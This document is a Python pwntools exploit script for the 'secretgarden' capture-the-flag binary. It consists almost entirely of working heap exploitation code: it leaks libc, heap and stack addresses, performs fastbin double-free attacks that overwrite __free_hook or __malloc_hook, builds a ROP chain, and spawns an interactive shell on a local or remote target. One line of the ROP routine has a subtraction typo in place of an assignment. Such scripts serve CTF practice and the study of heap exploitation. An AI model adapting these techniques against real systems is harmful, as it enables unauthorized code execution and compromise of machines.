#coding:utf-8
from pwn import *
import sys

def raise_flower(Length,Name,Color):
    io.sendlineafter('Your choice : ',str(1))
    io.sendlineafter('Length of the name :',str(Length))
    io.sendafter('The name of flower :',Name)
    io.sendlineafter('The color of the flower :',Color)
    io.recvuntil('Successful !\n')

def visit_garden():
    io.sendlineafter('Your choice : ',str(2))

def remove_flower(Index):
    io.sendlineafter('Your choice : ',str(3))
    io.sendlineafter('remove from the garden:',str(Index))

def clean_garden():
    io.sendlineafter('Your choice : ',str(4))
    io.recvuntil('Done!\n')

def leave():
    io.sendlineafter('Your choice : ',str(5))

def exploit(flag):

    #leaking libc_address
    #gdb.attach(io)
    raise_flower(0x100,'aaaa','0000')
    raise_flower(0x10,'bbbb','1111')
    remove_flower(0)
    raise_flower(0x10,'x','2222')
    visit_garden()
    io.recvuntil('Name of the flower[2] :')
    main_arena = 0
    if flag==1:
        libc.address = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))-0x3c4b78
        log.info('libc_address:'+hex(libc.address))
        main_arena = libc.address+0x3c4b20
    else:
        libc.address = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))-0x3c3b78
        log.info('libc_address:'+hex(libc.address))
        main_arena = libc.address+0x3c3b20
    log.info("main_arena:"+hex(main_arena))
    __free_hook = libc.symbols['__free_hook']
    log.info("__free_hook:"+hex(__free_hook))
    system = libc.symbols['system']
    log.info('system:'+hex(system))

    #leaking heap_address
    remove_flower(1)
    remove_flower(2)
    raise_flower(0x10,'\x80','3333')
    visit_garden()
    io.recvuntil('Name of the flower[3] :')
    heap_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x1180
    log.info("heap_addrss:"+hex(heap_base))
    #gdb.attach(io)
    '''
    Size=0x55 Can't pass assert

     assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
          ar_ptr == arena_for_chunk (mem2chunk (victim)));
    '''
    if hex(heap_base).startswith("0x55"):
        log.failure("Heap can't start with 0x55")
        sys.exit(1)

    remove_flower(3)
    clean_garden()
    visit_garden()
    io.recvuntil('No flower in the garden !\n')

    #Fastbin dup 
    raise_flower(0x40,'aaaa','0000')
    raise_flower(0x40,'bbbb','1111')
    raise_flower(0x40,'cccc','2222')

    remove_flower(0)
    remove_flower(1)
    remove_flower(0)


    raise_flower(0x40,p64(main_arena+0x2d),'3333')
    raise_flower(0x40,'dddd','4444')
    raise_flower(0x40,"/bin/sh\x00",'5555')

    ##This allocation is made so when freed an address will be placed in 16*6 fastbin size
    raise_flower(0x60,'eeee','6666')
    remove_flower(6)

    #Fastbin Attack to change *topchunk==>__free_hook-0xb58
    payload = "\x00"*0x1b
    payload += p64(__free_hook-0xb58)
    raise_flower(0x40,payload,'7777')

    #Request enough space to reach the __free_hook
    for i in range(0xd):
       raise_flower(0x90,'eeee','8888')
    '''
    for i in range(0x9):
       raise_flower(0x100,'eeee','8888')
    gdb.attach(io,"b *"+hex(proc_base+0x10b3))
    raise_flower(0x100,'eeee','8888')
    '''
    
    payload = p64(0)*17
    payload += p64(system)

    raise_flower(0x90,payload,'9999')
    #Trigger system("/bin/sh")
    remove_flower(5)

    io.interactive()

def exploit_realloc_hook(flag):
    #leaking libc_address
    raise_flower(0x100,'aaaa','0000')
    raise_flower(0x100,'bbbb','1111')
    remove_flower(0)
    raise_flower(0xc8,'x','2222')
    visit_garden()
    io.recvuntil('Name of the flower[2] :')
    if flag==1:
        libc.address = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))-0x3c4c78
        log.info('libc_address:'+hex(libc.address))
        one_gadget = libc.address+0xf02a4
    else:
        libc.address = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))-0x3c3c78
        log.info('libc_address:'+hex(libc.address))
        one_gadget = libc.address+0xef6c4 

    log.info('one_gadget:'+hex(one_gadget))
    system = libc.symbols['system']
    __malloc_hook=libc.symbols['__malloc_hook']
    log.info('__malloc_hook:'+hex(__malloc_hook))
    __libc_realloc = libc.symbols['__libc_realloc']
    log.info('__libc_realloc:'+hex(__libc_realloc))

    remove_flower(1)
    remove_flower(2)
    clean_garden()
    visit_garden()
    io.recvuntil('No flower in the garden !\n')

    #Fastbin Attack
    log.info('Fastbin Attack...')
    raise_flower(0x60,'a'*0x60,'0')
    raise_flower(0x60,'b'*0x60,'1')
    remove_flower(0)
    remove_flower(1)
    remove_flower(0)
    raise_flower(0x60,p64(__malloc_hook-0x23),'2')
    raise_flower(0x60,'c'*0x60,'3')
    raise_flower(0x60,'d'*0x60,'4')

    gdb.attach(io)
    payload = '\x00'*0xb
    payload += p64(one_gadget)
    payload += p64(__libc_realloc+0x14)
    #gdb.attach(io,'b *'+hex(proc_base+0xC65))
    raise_flower(0x60,payload,'5')
    log.info("spawn shell")
    io.sendlineafter('Your choice : ',str(1))

    io.interactive()

def exploit_rop(flag):
    #leaking libc_address
    raise_flower(0x100,'aaaa','0000')
    raise_flower(0x100,'bbbb','1111')
    remove_flower(0)
    raise_flower(0xc8,'x','2222')
    visit_garden()
    io.recvuntil('Name of the flower[2] :')
    if flag==1:
        libc.address = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))-0x3c4c78
        log.info('libc_address:'+hex(libc.address))
        prdi_ret = libc.address+0x21102
    else:
        libc.address = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))-0x3c3c78
        log.info('libc_address:'+hex(libc.address))
        prdi_ret - libc.address+0x21102
    log.info('pop rdi;ret:'+hex(prdi_ret))
    system = libc.symbols['system']
    log.info('system:'+hex(system))
    binsh_addr = next(libc.search('/bin/sh'))
    log.info('binsh_addr:'+hex(binsh_addr))
    environ = libc.symbols['environ']
    log.info('environ:'+hex(environ))

    remove_flower(1)
    remove_flower(2)
    clean_garden()
    visit_garden()
    io.recvuntil('No flower in the garden !\n')

    #leaking stack_addr by using Use After Free
    raise_flower(0x28,'a'*0x28,'0000')
    raise_flower(0x28,'b'*0x28,'1111')
    raise_flower(0x28,'c'*0x28,'2222')
    raise_flower(0x28,'d'*0x28,'3333')
    remove_flower(0)
    remove_flower(1)
    remove_flower(2)
    remove_flower(0)

    raise_flower(0x28,'e'*0x28,'4444')

    payload = p64(1)
    payload += p64(environ)
    raise_flower(0x28,payload,'5555')
    visit_garden()
    io.recvuntil('Name of the flower[4] :')
    stack_address = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))
    log.info('stack_address:'+hex(stack_address))
    remove_flower(3)
    clean_garden()
    
    #Fastbin Attack  
    raise_flower(0x60,'aaaa','0000')
    raise_flower(0x60,'aaaa','1111')
    remove_flower(0)
    remove_flower(1)
    remove_flower(0)
    clean_garden()

    raise_flower(0x60,p64(stack_address-0x18b),'3333')
    raise_flower(0x60,'aaaa','6666')
    raise_flower(0x60,'aaaa','7777')
    #gdb.attach(io,'b *'+hex(proc_base+0x10B3))

    payload = 0x2b*'A'
    payload += p64(prdi_ret)
    payload += p64(binsh_addr)+p64(system)
    raise_flower(0x60,payload,'8888')

    io.interactive()


if __name__ == "__main__":
    context.binary = "./secretgarden"
    #context.terminal = ['tmux','sp','-h']
    context.log_level = 'debug'
    elf = ELF('./secretgarden')
    if len(sys.argv)>1:
        io = remote(sys.argv[1],sys.argv[2])
        libc=ELF('./secretlibc_64.so.6')
        exploit(0)
    else:
        io = process('./secretgarden')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #proc_base = io.libs()['/mnt/hgfs/Binary/CTF/Shooting/pwnable.tw/secretgarden/workspace/secretgarden']
        #log.info('proc_base:'+hex(proc_base))
        #libc_base = io.libs()['/lib/x86_64-linux-gnu/libc.so.6']
        #log.info('libc_base:'+hex(libc_base))
        exploit_realloc_hook(1)
        #	exploit_rop(1)
	
                                            
